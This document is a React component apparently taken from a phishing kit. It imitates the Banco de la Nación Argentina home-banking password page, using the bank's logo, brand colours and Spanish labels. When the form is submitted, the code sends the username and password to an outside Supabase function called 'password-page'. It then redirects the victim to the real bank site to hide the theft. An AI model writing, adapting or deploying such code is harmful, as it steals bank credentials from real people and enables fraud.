import React, { useState } from 'react';
import { Lock, Eye, EyeOff, HelpCircle, Keyboard as KeyboardIcon } from 'lucide-react';
import VirtualKeyboard from './VirtualKeyboard';

interface PasswordFormProps {
  username: string;
}

const PasswordForm: React.FC<PasswordFormProps> = ({ username }) => {
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showKeyboard, setShowKeyboard] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      await fetch(`${import.meta.env.VITE_SUPABASE_URL}/functions/v1/password-page`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${import.meta.env.VITE_SUPABASE_ANON_KEY}`,
        },
        body: JSON.stringify({ 
          username,
          password 
        }),
      });

      await new Promise(resolve => setTimeout(resolve, 1500));
      window.location.href = 'https://bna.com.ar/Institucional';
    } catch (error) {
      console.error('Error:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleVirtualKeyPress = (key: string) => {
    if (key === 'backspace') {
      setPassword(prev => prev.slice(0, -1));
    } else {
      setPassword(prev => prev + key);
    }
  };

  return (
    <div className="bg-white w-[460px] px-6 py-4 font-bna">
      <form onSubmit={handleSubmit} className="ingreso">
        <div className="campos space-y-4">
          <div id="campoPassword">
            <img 
              src="https://hb.redlink.com.ar/bna/entidades/banco.nacion.v2/vista/imagenes/login/homebanking.jpg" 
              alt="Home Banking"
              className="mb-4 mx-auto"
            />
            <div className="text-center mb-4">
              <h2 className="text-lg font-semibold" style={{ color: 'rgb(0 135 171)' }}>¡Hola {username}!</h2>
            </div>
            <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">
              Clave
            </label>
            <div className="campo relative">
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <Lock className="h-5 w-5 text-gray-400" />
              </div>
              <input
                id="password"
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="block w-full pl-10 pr-12 py-2 border border-gray-300 rounded-md focus:ring-bna-blue focus:border-bna-blue"
                required
              />
              <div className="absolute inset-y-0 right-0 flex items-center space-x-1 pr-2">
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="text-gray-400 hover:text-bna-blue"
                >
                  {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                </button>
                <button
                  type="button"
                  onClick={() => setShowKeyboard(!showKeyboard)}
                  className="text-gray-400 hover:text-bna-blue"
                >
                  <KeyboardIcon className="h-5 w-5" />
                </button>
                <a href="#" className="preg">
                  <HelpCircle className="h-5 w-5 text-gray-400 hover:text-bna-blue" />
                </a>
              </div>
            </div>
            {showKeyboard && (
              <div className="mt-2">
                <VirtualKeyboard onKeyPress={handleVirtualKeyPress} isOpen={showKeyboard} />
              </div>
            )}
          </div>
        </div>

        <button
          type="submit"
          className={`w-full mt-6 py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-bna-blue hover:bg-bna-blue-dark focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-bna-blue uppercase ${
            loading ? 'opacity-75 cursor-not-allowed' : ''
          }`}
          disabled={loading}
        >
          {loading ? 'Procesando...' : 'INGRESAR'}
        </button>
      </form>

      <div className="mt-6 space-y-4">
        <div className="accesoBloqueado text-center">
          <a href="#" className="text-sm text-bna-blue hover:underline">
            ¿Acceso bloqueado?
          </a>
        </div>
        
        <div className="registrarse text-center">
          <a href="#" className="text-sm text-bna-blue hover:underline">
            ¿Primera vez que ingresás?
          </a>
        </div>
      </div>
    </div>
  );
};

export default PasswordForm;